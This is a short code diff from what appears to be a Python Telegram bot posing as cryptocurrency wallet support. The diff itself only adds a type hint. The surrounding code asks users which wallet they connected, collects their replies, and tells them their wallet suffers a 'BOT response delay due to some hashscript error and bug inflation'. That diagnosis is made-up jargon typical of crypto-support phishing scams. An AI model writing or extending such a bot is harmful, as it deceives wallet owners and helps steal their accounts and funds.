@@ -29,7 +29,7 @@ def ask_account(update: Update, context: CallbackContext):
      context.user_data["name"] = name # to use it later (in next func)
      update.message.reply_text("Which wallet account did you use to connect?")
      return ONE
-def first_question_step(update, context: CallbackContext):
+def first_question_step(update: Update, context: CallbackContext):
     chat_id = update.message.chat_id
     phone_number = update.message.text
     update.message.reply_text('I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
